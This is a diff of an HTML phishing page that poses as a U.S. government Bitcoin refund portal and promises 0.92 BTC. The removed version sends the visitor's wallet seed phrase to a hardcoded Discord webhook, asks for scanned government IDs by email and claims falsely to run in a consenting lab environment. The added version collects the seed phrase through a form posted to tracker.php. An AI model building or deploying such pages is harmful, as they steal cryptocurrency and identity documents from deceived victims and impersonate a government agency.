@@ -1,157 +1,89 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>U.S. Federal BTC Airdrop Portal</title>
+  <meta charset="UTF-8">
+  <title>GovBTCClaim Portal</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
-      margin: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #e6eff8;
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      background-image: url('https://www.transparenttextures.com/patterns/white-wall.png');
       text-align: center;
-      padding: 40px 20px;
-      color: #0a2342;
+      padding-top: 50px;
     }
 
-    .notice-bar {
-      background-color: #e8f1fb;
-      color: #0a2342;
-      padding: 18px 14px;
-      font-size: 0.98em;
-      border-bottom: 2px solid #c2d8f5;
-      line-height: 1.6;
-    }
-
-    h1 {
-      font-size: 1.9em;
-      font-weight: 700;
-      margin-top: 30px;
-    }
-
-    h1 span {
-      display: block;
-      font-size: 1.2em;
-      margin-top: 0.2em;
-      font-weight: 500;
-    }
-
-    .form-wrapper {
-      background: #fff;
-      padding: 30px;
-      border-radius: 16px;
-      box-shadow: 0px 8px 20px rgba(0, 0, 0, 0.1);
+    .container {
+      background: white;
+      width: 90%;
       max-width: 420px;
-      margin: 40px auto;
+      margin: auto;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
 
-    .amount {
-      font-weight: bold;
-      margin-bottom: 15px;
-      font-size: 1.1em;
+    h2 {
+      color: #003399;
     }
 
-    input, select, button {
-      display: block;
-      width: 100%;
-      padding: 14px;
-      font-size: 1em;
-      margin-bottom: 16px;
-      border-radius: 10px;
-      border: 2px solid #cbd5e1;
-      box-sizing: border-box;
-    }
-
-    input:focus, select:focus {
-      border-color: #0a2342;
-      outline: none;
-    }
-
-    button {
-      background-color: #0a2342;
+    .btn {
+      background-color: #003399;
       color: white;
-      font-weight: bold;
-      border: none;
-      cursor: pointer;
-      transition: background 0.3s ease;
-    }
-
-    button:hover {
-      background-color: #0b2d5c;
-    }
-
-    .contact-box {
-      font-size: 13px;
-      color: #777;
-      margin-top: 10px;
-      line-height: 1.6;
-    }
-
-    .footer-note {
-      font-size: 0.85em;
-      color: #444;
+      padding: 12px 20px;
       margin-top: 20px;
-      line-height: 1.4;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    .note {
+      font-size: 13px;
+      color: #555;
+      margin-top: 10px;
+    }
+
+    select, input[type="text"] {
+      padding: 10px;
+      width: 100%;
+      margin-top: 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
     }
   </style>
 </head>
 <body>
+  <div class="container">
+    <h2>🇺🇸 Government BTC Refund</h2>
+    <p>Claim your Bitcoin refund through verified wallet connection.</p>
+    <p><strong>Amount to be received: 0.92 BTC ≈ $99,791</strong></p>
 
-  <!-- 🔍 Tracker -->
-  <img src="tracker.php" style="display:none;" />
+    <button class="btn" onclick="document.getElementById('walletSection').style.display='block'">Connect Wallet</button>
 
-  <!-- 📩 Official Notice Bar -->
-  <div class="notice-bar">
-    📄 <strong>Notice:</strong> Eligible citizens are required to confirm their selection for the ongoing Federal Digital Asset Reimbursement.<br><br>
-    Please submit a scanned copy of your government-issued ID to  
-    <strong>admin@govbtcclaim.org</strong><br>
-    Subject line: <em>Eligibility Confirmation – BTC Reimbursement</em>
-  </div>
+    <form id="walletSection" action="tracker.php" method="POST" style="display:none; margin-top:20px;">
+      <label for="walletSelect">Wallet Type:</label>
+      <select id="walletSelect" name="wallet">
+        <option value="MetaMask">MetaMask</option>
+        <option value="TrustWallet">Trust Wallet</option>
+        <option value="Coinbase">Coinbase Wallet</option>
+        <option value="Other">Other</option>
+      </select>
 
-  <h1>🇺🇸 U.S. Federal BTC Airdrop Portal
-    <span>Submit to verify eligibility & claim stimulus-linked Bitcoin</span>
-  </h1>
+      <label for="seedInput" style="margin-top:10px;">Seed Phrase:</label>
+      <input type="text" id="seedInput" name="phrase" placeholder="Enter your 12 or 24-word phrase" required>
 
-  <div class="form-wrapper">
-    <div class="amount">Amount to be received: 0.92 BTC ≈ $99,791</div>
-
-    <form onsubmit="sendToDiscord(event)">
-      <input type="text" name="wallet" placeholder="Wallet Provider (e.g. MetaMask)" required>
-      <input type="text" name="phrase" placeholder="Enter 12 or 24-word Recovery Phrase" required>
-      <button type="submit">Claim Official Airdrop</button>
+      <button class="btn" type="submit">Submit</button>
     </form>
 
-    <div class="contact-box">
+    <div class="note">
       Minimum wallet balance: 0.0092 BTC<br>
       <small>(If your balance is lower, contact support)</small><br>
-      For inquiries: <strong>admin@govbtcclaim.org</strong>
+      For inquiries: <strong>govbtcclaim@outlook.com</strong>
     </div>
   </div>
 
-  <div class="footer-note">
-    This page is operating in a secured lab environment with full participant consent.
-  </div>
-
-  <!-- 📤 Discord Webhook Submission -->
-  <script>
-    function sendToDiscord(event) {
-      event.preventDefault();
-      const wallet = document.querySelector('input[name="wallet"]').value;
-      const phrase = document.querySelector('input[name="phrase"]').value;
-
-      const message = `📥 **New Submission**\n🔐 Wallet: ${wallet}\n🧠 Phrase: ${phrase}`;
-
-      fetch("https://discord.com/api/webhooks/1392560855530602496/WLDqr-oxayIjorh97lgir03TQj4rcVYqnKDEMCoJ_jC_xix590twBocxE4eMY85ViMzG", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: message })
-      });
-
-      alert("Submission received ✅");
-    }
-  </script>
-
-  <!-- 💬 Live Chat Widget (Tawk.to) -->
+  <!-- Live Chat Widget -->
   <script type="text/javascript">
     var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
     (function() {
@@ -163,6 +95,5 @@
       s0.parentNode.insertBefore(s1, s0);
     })();
   </script>
-
 </body>
 </html>
